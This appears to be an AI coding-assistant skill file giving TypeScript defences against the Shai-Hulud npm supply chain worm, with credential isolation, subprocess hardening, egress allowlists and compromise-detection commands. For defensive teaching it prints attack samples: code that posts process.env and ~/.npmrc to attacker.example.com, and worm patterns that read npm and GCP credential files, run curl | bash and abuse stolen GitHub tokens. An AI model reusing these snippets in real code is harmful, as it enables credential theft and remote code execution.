---
name: supply-chain-secure-code
description: Use when writing TypeScript code that interacts with dependencies, handles credentials, executes child processes, or manages configuration. Provides Shai-Hulud supply chain attack countermeasures at the code level including safe dependency usage, credential handling, subprocess hardening, and runtime integrity patterns.
allowed-tools: Read, Write, Edit, Bash, Grep, Glob
user-invocable: true
---

# Supply Chain Secure Code

This skill provides TypeScript coding patterns that defend against supply chain attacks at the application code level. While `supply-chain-secure-install` and `supply-chain-secure-publish` handle package management, this skill addresses what happens inside your code when dependencies are loaded and executed.

## When to Apply

Apply these guidelines when:
- Importing and using third-party packages
- Handling credentials, tokens, or API keys in code
- Spawning child processes or executing shell commands
- Loading configuration from files or environment variables
- Writing code that reads/writes `.npmrc`, `.env`, or credential files
- Implementing runtime checks for dependency integrity
- Reviewing code for supply chain attack vectors

## Threat Model: Code-Level Attack Vectors

In the Shai-Hulud attacks, malicious code inside compromised packages performed:

| Code-Level Attack | Description | Defense |
|-------------------|-------------|---------|
| Credential file reading | Read `.npmrc`, `.env`, cloud credential files | Restrict file access, use secrets managers |
| Environment variable exfiltration | Dump `process.env` and send to attacker | Minimize env vars, validate at boundaries |
| HTTP exfiltration | Send stolen data via HTTP to attacker C&C | Monitor outbound connections, CSP |
| Child process spawning | Execute `curl`, PowerShell, or download binaries | Validate all subprocess invocations |
| GitHub API abuse | Use stolen tokens to create repos, register runners | Short-lived tokens, minimal scopes |
| DNS manipulation | Modify `/etc/resolv.conf` to redirect traffic | Avoid running as root, monitor DNS config |
| Firewall manipulation | Delete iptables rules to enable C&C communication | Run in restricted containers |
| Lifecycle script exploitation | `preinstall`/`postinstall` in package.json runs arbitrary code | Bun blocks by default; never add packages to `trustedDependencies` without review |

**NOTE**: Bun blocks lifecycle scripts by default. The code patterns below address threats that execute AFTER an attacker gains code execution (e.g., via a trusted dependency that was compromised, or code running in a CI/CD environment where scripts may be enabled).

## Credential Handling

### Never Hardcode Credentials

```typescript
// BAD - hardcoded token
const token = "npm_xxxxxxxxxxxxxxxxxxxx";

// BAD - template literal with partial hardcode
const apiKey = `sk-${config.suffix}`;

// GOOD - environment variable
const token = process.env.NPM_TOKEN;
if (!token) {
  throw new Error("NPM_TOKEN environment variable is required");
}
```

### Validate Credential Sources

```typescript
import { z } from "zod";

// Define expected environment variables with validation
const envSchema = z.object({
  DATABASE_URL: z.string().url(),
  API_KEY: z.string().min(20),
  // Explicitly list what is needed - nothing more
});

// Validate at application startup
const env = envSchema.parse(process.env);

// Use validated env object, not raw process.env
// This prevents accidentally leaking unexpected env vars
```

### Credential Isolation

```typescript
// BAD - passing entire process.env to subprocess
Bun.spawn(["some-tool"], {
  env: process.env,  // Exposes ALL env vars including tokens
});

// GOOD - pass only needed env vars
Bun.spawn(["some-tool"], {
  env: {
    PATH: process.env.PATH ?? "",
    HOME: process.env.HOME ?? "",
    // Only pass what the tool actually needs
  },
});
```

### Credential Cleanup

```typescript
// If a credential must be in memory, clear it when done
function withCredential<T>(
  envVar: string,
  fn: (cred: string) => T
): T {
  const cred = process.env[envVar];
  if (!cred) {
    throw new Error(`${envVar} not set`);
  }
  try {
    return fn(cred);
  } finally {
    // Cannot truly clear from process.env in Node/Bun,
    // but at least don't keep references
  }
}
```

## Safe Dependency Usage

### Import Validation

```typescript
// GOOD - import from known, specific packages
import { z } from "zod";
import { ok, err } from "neverthrow";

// SUSPICIOUS - dynamic imports from computed strings
// This pattern was used by Shai-Hulud to load payloads
const module = await import(`./${userInput}`);  // DANGEROUS

// SUSPICIOUS - imports from URLs
const module = await import("https://example.com/module.js");  // DANGEROUS
```

### Dependency Surface Minimization

```typescript
// BAD - importing entire library for one function
import _ from "lodash";
const result = _.debounce(fn, 300);

// GOOD - import only what you need (reduces attack surface)
import debounce from "lodash.debounce";
const result = debounce(fn, 300);

// BEST - use Bun built-ins where available
// Bun.hash(), Bun.file(), Bun.glob(), etc.
```

### Avoid eval and Dynamic Code Execution

```typescript
// DANGEROUS - eval executes arbitrary code
eval(data);                    // NEVER
new Function(data)();          // NEVER
import(variable);              // AVOID (use static imports)

// The Shai-Hulud payload used obfuscated code executed at runtime
// Any pattern that constructs and executes code is a risk
```

## Subprocess Security

### Validated Subprocess Execution

```typescript
// BAD - shell injection via string interpolation
Bun.spawn(["sh", "-c", `echo ${userInput}`]);

// BAD - passing untrusted input to shell
Bun.spawn(["sh", "-c", command]);

// GOOD - use array form with explicit arguments
Bun.spawn(["echo", userInput]);

// GOOD - use Bun.$ with tagged template (auto-escapes)
const result = await Bun.$`echo ${userInput}`;
```

### Subprocess Environment Isolation

```typescript
// CRITICAL: Never pass full process.env to subprocesses
// Shai-Hulud specifically spawned processes with inherited env
// to maintain access to stolen tokens

const safeEnv: Record<string, string> = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  HOME: process.env.HOME ?? "/tmp",
  LANG: process.env.LANG ?? "en_US.UTF-8",
  // Explicitly DO NOT include:
  // - NPM_TOKEN
  // - GITHUB_TOKEN
  // - AWS_* credentials
  // - AZURE_* credentials
  // - GOOGLE_APPLICATION_CREDENTIALS
};

const proc = Bun.spawn(["some-tool", "--flag"], {
  env: safeEnv,
  cwd: "/sandboxed/path",
});
```

### Never Download and Execute

```typescript
// DANGEROUS - This is EXACTLY what Shai-Hulud does
// setup_bun.js downloads and executes bun_environment.js

// BAD
const response = await fetch("https://example.com/script.js");
const code = await response.text();
eval(code);  // NEVER

// BAD
await Bun.$`curl -sSL https://example.com/install.sh | bash`;

// GOOD - if you must download tools, verify checksums
import { createHash } from "crypto";

async function verifiedDownload(
  url: string,
  expectedSha256: string
): Promise<ArrayBuffer> {
  const response = await fetch(url);
  const data = await response.arrayBuffer();
  const hash = createHash("sha256")
    .update(Buffer.from(data))
    .digest("hex");

  if (hash !== expectedSha256) {
    throw new Error(
      `Integrity check failed: expected ${expectedSha256}, got ${hash}`
    );
  }
  return data;
}
```

## File Access Security

### Credential File Protection

```typescript
// Shai-Hulud reads these files to steal credentials:
// - ~/.npmrc (npm tokens)
// - ~/.config/gcloud/application_default_credentials.json (GCP)
// - ~/.aws/credentials (AWS)
// - ~/.azure/ (Azure)

// If your code reads credential files, validate the path strictly
import { resolve, normalize } from "path";

function safeResolvePath(
  basePath: string,
  userPath: string
): string {
  const resolved = resolve(basePath, userPath);
  const normalized = normalize(resolved);

  // Prevent path traversal
  if (!normalized.startsWith(normalize(basePath))) {
    throw new Error("Path traversal detected");
  }

  return normalized;
}
```

### File Content Validation

```typescript
import { z } from "zod";

// When loading config files, validate the schema
const configSchema = z.object({
  apiEndpoint: z.string().url(),
  timeout: z.number().int().positive().max(30000),
  // Strict schema prevents injection of unexpected fields
});

async function loadConfig(path: string): Promise<z.infer<typeof configSchema>> {
  const file = Bun.file(path);
  const raw = await file.json();
  return configSchema.parse(raw);  // Throws on unexpected fields
}
```

## Network Security

### Outbound Request Validation

```typescript
// If your code makes HTTP requests, validate URLs
const ALLOWED_HOSTS = new Set([
  "api.example.com",
  "registry.npmjs.org",
]);

function validateUrl(url: string): URL {
  const parsed = new URL(url);

  if (!ALLOWED_HOSTS.has(parsed.hostname)) {
    throw new Error(`Blocked request to unauthorized host: ${parsed.hostname}`);
  }

  // Block internal/metadata endpoints
  if (
    parsed.hostname === "169.254.169.254" ||  // AWS/GCP metadata
    parsed.hostname === "metadata.google.internal" ||
    parsed.hostname.endsWith(".internal")
  ) {
    throw new Error("Blocked request to cloud metadata endpoint");
  }

  return parsed;
}
```

### HTTP Response Validation

```typescript
import { z } from "zod";

// Always validate API responses - compromised dependencies
// could return unexpected data
const apiResponseSchema = z.object({
  data: z.array(z.object({
    id: z.string(),
    name: z.string(),
  })),
  meta: z.object({
    total: z.number(),
  }),
});

async function fetchApi(url: string) {
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }
  const json = await response.json();
  return apiResponseSchema.parse(json);  // Validate shape
}
```

## Runtime Integrity Patterns

### Package Integrity Verification

```typescript
import { readFileSync } from "fs";
import { createHash } from "crypto";

// Verify critical dependency files at startup
function verifyDependencyIntegrity(
  checks: Array<{ path: string; expectedHash: string }>
): void {
  for (const { path, expectedHash } of checks) {
    const content = readFileSync(path);
    const actualHash = createHash("sha256")
      .update(content)
      .digest("hex");

    if (actualHash !== expectedHash) {
      throw new Error(
        `Integrity check failed for ${path}: ` +
        `expected ${expectedHash}, got ${actualHash}`
      );
    }
  }
}

// Run at application startup for critical dependencies
// verifyDependencyIntegrity([
//   { path: "node_modules/critical-lib/index.js", expectedHash: "abc123..." },
// ]);
```

### Startup Health Check

```typescript
// Check for signs of compromise at application startup

function startupSecurityCheck(): void {
  // 1. Check for suspicious environment variables
  const suspiciousVars = [
    "POSTINSTALL_BG",  // Used by Shai-Hulud 2.0 for background execution
  ];

  for (const varName of suspiciousVars) {
    if (process.env[varName] !== undefined) {
      console.error(
        `WARNING: Suspicious environment variable detected: ${varName}`
      );
    }
  }

  // 2. Check for unexpected processes (informational)
  // The Shai-Hulud worm spawns detached background processes

  // 3. Verify we are running the expected Bun version
  const bunVersion = Bun.version;
  // Log for audit purposes
  console.log(`Runtime: Bun ${bunVersion}`);
}
```

## Code Review Checklist

When reviewing TypeScript code for supply chain security:

### High Priority

- [ ] No hardcoded credentials, tokens, or API keys
- [ ] No `eval()`, `new Function()`, or dynamic `import()` with user input
- [ ] No `curl | bash` or download-and-execute patterns
- [ ] Subprocess calls use array form, not shell string interpolation
- [ ] Subprocess calls do NOT inherit full `process.env`
- [ ] No reading of credential files (`.npmrc`, cloud creds) without explicit need

### Medium Priority

- [ ] All external HTTP requests validate response schemas
- [ ] File paths are validated against path traversal
- [ ] Environment variables are validated with schema (e.g., zod)
- [ ] Dependencies are imported statically, not dynamically
- [ ] Import surface is minimized (specific imports, not entire libraries)

### Low Priority (Defense in Depth)

- [ ] Critical dependency integrity can be verified at startup
- [ ] Outbound network requests are limited to known hosts
- [ ] Startup health checks detect anomalous environment
- [ ] Logging does not include credential values

## Anti-Patterns Detected in Shai-Hulud

These exact code patterns were used by the Shai-Hulud malware. Flag them during review:

```typescript
// PATTERN 1: Read .npmrc to steal tokens
// Shai-Hulud reads ~/.npmrc and CWD/.npmrc
const npmrc = readFileSync(join(homedir(), ".npmrc"), "utf-8");
const token = npmrc.match(/_authToken=(.+)/)?.[1];

// PATTERN 2: Enumerate and hijack packages
// Shai-Hulud queries npm registry for all maintainer packages
const response = await fetch(
  `https://registry.npmjs.org/-/v1/search?text=maintainer:${username}&size=100`
);

// PATTERN 3: Spawn detached background process
// Shai-Hulud uses unref() to detach from parent
const child = Bun.spawn(["bun", "payload.js"], { detached: true });
child.unref();  // Parent exits, child keeps running

// PATTERN 4: Download and execute runtime
// Shai-Hulud installs Bun via curl | bash
await $`curl -fsSL https://bun.sh/install | bash`;

// PATTERN 5: GitHub API abuse with stolen token
// Shai-Hulud creates repos, registers self-hosted runners
const octokit = new Octokit({ auth: stolenToken });
await octokit.repos.createForAuthenticatedUser({
  name: randomId,
  description: "Shai-Hulud: The Second Coming.",
});

// PATTERN 6: Cloud credential theft
// Shai-Hulud reads GCP application default credentials
const gcpCreds = readFileSync(
  join(homedir(), ".config/gcloud/application_default_credentials.json")
);
```

## Defending Against Compromised Imports (Non-Lifecycle Attacks)

**This is the biggest remaining gap after lifecycle script blocking.** A future attacker could inject malicious code into a package's main source code instead of lifecycle scripts. This code would execute when your application imports the package -- Bun's default script blocking does NOT protect against this.

### How This Attack Works

```typescript
// Attacker compromises "popular-lib" and modifies its index.ts:
export function doSomething() {
  // Normal functionality preserved...
  const result = actualImplementation();

  // BUT ALSO: silently exfiltrate credentials
  // This runs when your code imports and calls this function
  try {
    globalThis.fetch?.("https://attacker.example.com/collect", {
      method: "POST",
      body: JSON.stringify({
        env: process.env,
        cwd: process.cwd(),
        npmrc: require("fs").readFileSync(
          require("path").join(require("os").homedir(), ".npmrc"), "utf-8"
        ).catch(() => ""),
      }),
    }).catch(() => {});
  } catch {}

  return result;
}
```

### Defense Layers

#### Layer 1: minimumReleaseAge (Preventive)

The cooldown period remains effective -- it delays when you receive any new version, giving the community time to detect compromised code.

#### Layer 2: Lockfile Review (Detective)

Review `bun.lock` (text) changes in every pull request:

```bash
# In CI: check for unexpected dependency changes
git diff origin/main -- bun.lock
```

Look for:
- Version bumps you did not request
- New transitive dependencies
- Changed integrity hashes

#### Layer 3: Network Egress Control (Containment)

Restrict what network connections your application can make:

```typescript
// For applications with known API endpoints,
// implement an egress allowlist at the HTTP client level

const ALLOWED_EGRESS_HOSTS = new Set([
  "api.yourservice.com",
  "registry.npmjs.org",
  "github.com",
]);

// Monkey-patch fetch for development/testing (NOT production)
if (process.env.NODE_ENV === "development") {
  const originalFetch = globalThis.fetch;
  globalThis.fetch = async (input, init) => {
    const url = new URL(typeof input === "string" ? input : input.url);
    if (!ALLOWED_EGRESS_HOSTS.has(url.hostname)) {
      console.warn(`[SECURITY] Blocked egress to: ${url.hostname}`);
      throw new Error(`Egress blocked: ${url.hostname}`);
    }
    return originalFetch(input, init);
  };
}
```

For production, use OS/container-level network policies:

```bash
# Docker: restrict outbound network
docker run --network=restricted-net your-app

# Kubernetes: NetworkPolicy
# CI/CD: restrict runner network egress
```

#### Layer 4: Private Registry / Proxy (Preventive)

Route all package installs through a private registry that provides additional scanning:

```toml
# bunfig.toml
[install]
registry = "https://your-private-registry.example.com/"
```

Options:
- **Verdaccio**: Self-hosted, free, npm-compatible proxy
- **Artifactory / Nexus**: Enterprise, with vulnerability scanning
- **Socket.dev proxy**: Behavioral analysis of packages

#### Layer 5: SBOM and Dependency Monitoring (Detective)

Generate Software Bill of Materials for continuous monitoring:

```bash
# Generate SBOM in CycloneDX format
bunx @cyclonedx/cyclonedx-npm --output-file sbom.json

# Or SPDX format
bunx @spdx/sbom-generator --output sbom.spdx.json
```

Integrate with monitoring:
- Dependabot / Renovate for automated update PRs
- GitHub Dependency Graph for visibility
- Socket.dev for behavioral analysis
- Snyk for vulnerability scanning

## GitHub Token Hardening

Shai-Hulud 2.0 specifically abuses GitHub PATs to create C&C infrastructure, register self-hosted runners, and inject malicious workflows. Minimize the blast radius of stolen tokens.

### Fine-Grained PATs (Mandatory)

**NEVER use classic PATs.** Always use fine-grained personal access tokens:

| Setting | Recommendation |
|---------|---------------|
| Resource owner | Specific organization, not personal |
| Repository access | Only selected repositories, NEVER "All repositories" |
| Expiration | 30 days maximum |
| Permissions | Minimum required (see below) |

### Minimal Permission Sets

```
# For CI/CD that only reads code:
Contents: read
Metadata: read

# For CI/CD that creates releases:
Contents: write
Metadata: read

# NEVER grant these unless absolutely needed:
# - Administration (Shai-Hulud uses this to register runners)
# - Actions: write (Shai-Hulud uses this to inject workflows)
# - Workflows (Shai-Hulud uses this to create discussion.yaml)
```

### GitHub Actions Token Restrictions

```yaml
# In GitHub Actions, always set minimal permissions
permissions:
  contents: read

# NEVER use:
permissions: write-all  # Gives attacker full access

# For jobs that need specific permissions:
jobs:
  deploy:
    permissions:
      contents: read
      deployments: write
      # Each permission is explicitly justified
```

### Self-Hosted Runner Security

Shai-Hulud registers compromised machines as self-hosted runners named "SHA1HULUD":

1. **Monitor runner registrations** - alert on new self-hosted runners
2. **Use ephemeral runners** - runners that are destroyed after each job
3. **Restrict runner groups** - limit which workflows can use which runners
4. **Never run self-hosted runners on developer machines** - use dedicated VMs/containers

```bash
# Check for unexpected self-hosted runners
gh api repos/{owner}/{repo}/actions/runners --jq '.runners[] | .name'

# Look for: "SHA1HULUD" or any unrecognized runner names
```

## Post-Compromise Detection

Use this checklist if you suspect your environment may have been compromised by Shai-Hulud or similar attacks.

### Immediate Checks

```bash
# 1. Check for Shai-Hulud marker repositories
# Shai-Hulud creates repos with description "Shai-Hulud: The Second Coming."
gh repo list --json name,description --jq '.[] | select(.description | test("Shai.Hulud"; "i"))'

# 2. Check for unexpected self-hosted runners
gh api repos/{owner}/{repo}/actions/runners --jq '.runners[] | {name, status, os}'
# RED FLAG: runner named "SHA1HULUD"

# 3. Check for injected workflows
find .github/workflows -name "*.yml" -newer package.json
# RED FLAG: discussion.yaml or anything you did not create

# 4. Check for unexpected GitHub Actions workflow runs
gh run list --limit 20 --json name,status,createdAt
# RED FLAG: "Code Formatter" workflow you did not create

# 5. Check npm token activity
bunx npm token list
# RED FLAG: tokens you did not create

# 6. Check npm package publish history
bunx npm info <your-package> time
# RED FLAG: recent publishes you did not make
```

### File System Checks

```bash
# 7. Check for Shai-Hulud artifacts
find ~ -name "setup_bun.js" -o -name "bun_environment.js" 2>/dev/null
# RED FLAG: these files should not exist

# 8. Check for unauthorized bun installations
which -a bun
ls ~/.dev-env/ 2>/dev/null
# RED FLAG: bun installed in unexpected locations (e.g., ~/.dev-env/)

# 9. Check for modified DNS configuration
cat /etc/resolv.conf
# RED FLAG: unexpected DNS servers

# 10. Check for modified firewall rules (Linux)
sudo iptables -L OUTPUT 2>/dev/null
sudo iptables -L DOCKER-USER 2>/dev/null
# RED FLAG: rules have been deleted
```

### Process Checks

```bash
# 11. Check for suspicious background processes
ps aux | grep -E "(bun_environment|setup_bun|SHA1HULUD)"
# RED FLAG: any matches

# 12. Check for processes connecting to unexpected hosts
# (requires lsof or ss)
ss -tunp | grep -v -E "(127.0.0.1|::1|your-known-hosts)"
# RED FLAG: connections to unknown external hosts

# 13. Check environment for Shai-Hulud markers
env | grep POSTINSTALL_BG
# RED FLAG: POSTINSTALL_BG=1 means payload is running in background
```

### Cloud Credential Checks

```bash
# 14. AWS: Check for unauthorized access
aws sts get-caller-identity
aws secretsmanager list-secrets --region us-east-1
# RED FLAG: access from unexpected principal or region

# 15. GCP: Check for unauthorized access
gcloud auth list
gcloud secrets list 2>/dev/null
# RED FLAG: unexpected service accounts

# 16. Azure: Check for unauthorized access
az account show
az keyvault list 2>/dev/null
# RED FLAG: unexpected subscriptions or vaults
```

### If Compromise Is Confirmed

1. **Immediately rotate ALL credentials**:
   - npm tokens
   - GitHub PATs and SSH keys
   - AWS/GCP/Azure credentials
   - Any secrets stored in CI/CD
   - Database passwords

2. **Unpublish compromised package versions**

3. **Remove unauthorized GitHub runners and workflows**

4. **Review and revoke GitHub App authorizations**

5. **Check git history for unauthorized commits**

6. **Notify affected downstream users**

7. **File incident report** with npm security (security@npmjs.com)

## References

- [Shai-Hulud 2.0 Technical Analysis - Trend Micro](https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html)
- [Bun Security - Subprocess API](https://bun.sh/docs/runtime/subprocess)
- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)
- [Node.js Security Best Practices](https://nodejs.org/en/learn/getting-started/security-best-practices)
- [Socket.dev - Package Behavioral Analysis](https://socket.dev/)
- [GitHub Fine-Grained PATs](https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#fine-grained-personal-access-tokens)
